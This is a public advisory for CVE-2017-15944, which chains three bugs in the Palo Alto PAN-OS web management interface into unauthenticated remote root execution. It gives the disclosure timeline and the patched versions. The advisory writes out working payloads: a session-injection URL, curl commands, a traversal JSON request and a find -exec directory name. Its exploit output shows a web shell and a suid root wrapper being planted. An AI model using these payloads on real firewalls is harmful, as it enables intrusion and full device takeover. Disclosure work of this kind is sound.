This is a public advisory for CVE-2017-15944 which is a remote root code
execution bug in Palo Alto Networks firewalls.

Three separate bugs can be used together to remotely execute commands as
root through the web management interface without authentication on: PAN-OS
6.1.18 and earlier, PAN-OS 7.0.18 and earlier, PAN-OS 7.1.13 and earlier,
PAN-OS 8.0.5 and earlier.

Palo Alto Networks recommends not exposing the web management interface to
the internet. By looking at Project Sonar or Shodan it is evident that it's
actually quite common to deploy the firewalls with the web management
interface listening on the WAN port.

PAN-OS 6.1.19, PAN-OS 7.0.19, PAN-OS 7.1.14 and PAN-OS 8.0.6 are patched
and can be downloaded from https://support.paloaltonetworks.com/

=*=*=*=*=*=*=*=*=    TIMELINE

2017-07-09: Report submitted.

2017-07-11: Palo Alto Networks PSIRT confirm that they received the report
and assign PDV-348 for tracking the issues.

2017-12-05: The bugs are made public by Palo Alto Networks at
https://securityadvisories.paloaltonetworks.com

2017-12-11: I send out this public advisory.

=*=*=*=*=*=*=*=*=    DESCRIPTION

- Bug #1: Partial authentication bypass

The file `/etc/appweb3/conf/common.conf` contains the web configuration for
the web server that handles the web management interface.

It configures an authentication filter on most subdirectories using the
following format:

<Location /php>
  panAuthCheck on
</Location>

This means that all requests to /php/* will be checked for an authenticated
session cookie. The functionality itself is implemented in the
`libpanApiWgetFilter.so` library file.

The function `openAuthFilter()` will look for the PHPSESSID cookie and then
call the `readSessionVarsFromFile()` function on the session file to
extract the `dloc` and `user` values.

The problem is that `readSessionVarsFromFile()` is not using the official
PHP functions to read the serialized session data, but its own parser using
`strtok()` which is not implemented correctly.

The PHP session format which `readSessionVarsFromFile()` tries to parse
looks like this for string values:
locale|s:2:"en";

Explained:
var_name|s:str_length:"string value"; var_name|s:str_length:"another
string";...


If we can inject a value into the session file that contains the `";`
character sequence, we can break the parser and inject our own value for
the `user` variable.

We can do this by calling the `/esp/cms_changeDeviceContext.esp` script,
which does not need any kind of authentication to be called.

It will call the `panUserSetDeviceLocation()` function located in
`panmodule.so`, which splits the `dloc` GET parameter by ":" and sets the
`dloc` and `loc` session variables to the second value.

We can corrupt the session file by calling the following url:
`/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";`

Which produces the following contents in `/tmp/sess_<sessionid>`:
`dloc|s:20:"8:a'";user|s."1337";";loc|s:27:"16:a'";user|s."1337";:vsys1";`

When this is parsed by the `readSessionVarsFromFile()` function, it will
extract `16:a'` as the value for the `user` variable.

It will then use this in XML requests to the backend to check if the user
is authenticated, but this produces an XML injection that results in an
invalid XML document:

```
Entity: line 1: parser error : attributes construct error
<request cmd='op' cookie='16:a''  refresh='no'><operations
xml='yes'><show><cli>
```

The extra single quote character is injected into the cookie value, which
makes the request fail because of a parser error. Interestingly enough, the
`panCheckSessionExpired()` function in `libpanApiWgetFilter.so` does not
recognize this unexpected state and believes that authentication has
succeeded.

We can now access any PHP file protected by the panAuthCheck directive
using our manipulated session cookie.

Example:

imac:~/pa% curl -H "Cookie: PHPSESSID=hacked;" 10.0.0.1/php/utils/debug.php
<!DOCTYPE html>
<html><head><title>Moved Temporarily</title></head>
<body><h1>Moved Temporarily</h1>
<p>The document has moved <a href="http://10.0.0.1:28250/php/logout.php
">here</a>.</p>
<address>PanWeb Server/ -  at 127.0.0.1:28250 Port 80</address></body>
</html>
imac:~/pa% curl -H "Cookie: PHPSESSID=hacked;" '
10.0.0.1/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";'
@start@Success@end@
imac:~/pa% curl -H "Cookie: PHPSESSID=hacked;" 10.0.0.1/php/utils/debug.php
2>/dev/null|head -30
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "
http://www.w3.org/TR/html4/loose.dtd";>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <title>Debug Console</title>


It's important to note that we still don't have a valid, logged in session.
Most PHP scripts will fail, but we do bypass the authentication check in
the web server.

- Bug #2:  Arbitrary directory creation

The `/php/utils/router.php` file handles API requests for the web
management interface backend communication. It exposes most of the PHP
classes that comprise the web application in a simple remote procedure call
interface over HTTP POST/JSON.

The `/php/device/Administrator.php` file declares the `Administrator`
class. It contains a method called `get` that we can call from `router.php`.

In the `get` method there is an XML injection in the call to
`Direct::getConfigByXpath`. The `jsonArgs->id` parameter is appended to the
request without any sanitation. This allows us to manipulate the XML
request that is sent to the backend.

Normal request:
<request cmd="get" obj="/config/mgt-config/users/entry[@name='admin']"
cookie="12312312312"/>

We can inject our own values into the end of the `obj` attribute, and
therefore control all of the remaining XML request.

The `pan_cfg_req_ctxt_construct()` function in `libpanmp_mp.so` handles the
parsing of XML requests in the backend.

If we send a request tag with the `async-mode='yes'` attribute set, the
backend will create a temporary file and parent directory in
`/opt/pancfg/session/pan/user_tmp/<cookie value>/<jobid>.xml` that contains
the output of the request.

Since we can control the `<cookie value>` part of the created directory
structure, we can use a directory traversal attack to create a directory
with an arbitrary name anywhere on the system.

For example, by sending the following crafted POST request:

{"action":"PanDirect","method":"execute","data":
["07c5807d0d927dcd0980f86024e5208b","Administrator.get",
{"changeMyPassword":true,"template":"asd","id":"admin']\"
async-mode='yes' refresh='yes'
cookie='../../../../../../tmp/hacked'/>\u0000"}],"type":"rpc","tid":713}


The backend receives the following XML request, resulting in the
`/tmp/hacked` directory being created:

<request cmd="get" obj="/config/mgt-config/users/entry[@name='admin']"
async-mode="yes" refresh="yes" cookie="../../../../../../tmp/hacked"/>


- Bug #3:  Command injection in cron script

There is a cron entry that executes `/usr/local/bin/genindex_batch.sh`
every 15 minutes.

This shellscript will in turn execute `/usr/local/bin/genindex.sh` to
generate indexes from database files in `/opt/pancfg/mgmt/logdb/`.

There is a command injection vulnerability in how this shellscript handles
filename processing:

<redacted at the request of PA networks>

Since we can create directories in `$PAN_BASE_DIR/logdb/$dir/1`, we are
able to influence the output of the first `find` command.

This output is then used as an argument in the second execution of `find`,
but without enclosing quotes. We can therefore inject arbitrary arguments
in this invocation. By passing the `-exec` option to `find`, we can make it
execute arbitrary system commands.

My exploit creates a directory called:
`* -print -exec python -c exec("[base64 code..]".decode("base64")) ;`

The base64-encoded python code will be executed as root, which creates a
simple web shell in `/var/appweb/htdocs/api/c.php` as well as a suid root
wrapper in `/bin/x`.

=*=*=*=*=*=*=*=*=    EXPLOIT OUTPUT

imac:~/pa% python panos-rce.py http://10.0.0.1/
creating corrupted session...
http://10.0.0.1/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27
";user|s."1337";
done, verifying..
http://10.0.0.1/php/utils/debug.php
panAuthCheck bypassed
verifying that directory creation works..
http://10.0.0.1/php/utils/router.php/Administrator.get
http://10.0.0.1/api/test/202.xml
creating /opt/pancfg/mgmt/logdb/traffic/1/ entry
shell at http://10.0.0.1/api/c.php should be created in 8 minutes.. please
wait

web shell created, rootshell accessible with /bin/x -p -c 'command'
uid=99(nobody) gid=99(nobody) euid=0(root)
Linux PA-3060 2.6.32.27-7.1.10.0.30 #1 SMP Thu May 4 20:10:01 PDT 2017
x86_64 x86_64 x86_64 GNU/Linux

$


=*=*=*=*=*=*=*=*=    CREDIT

Philip Pettersson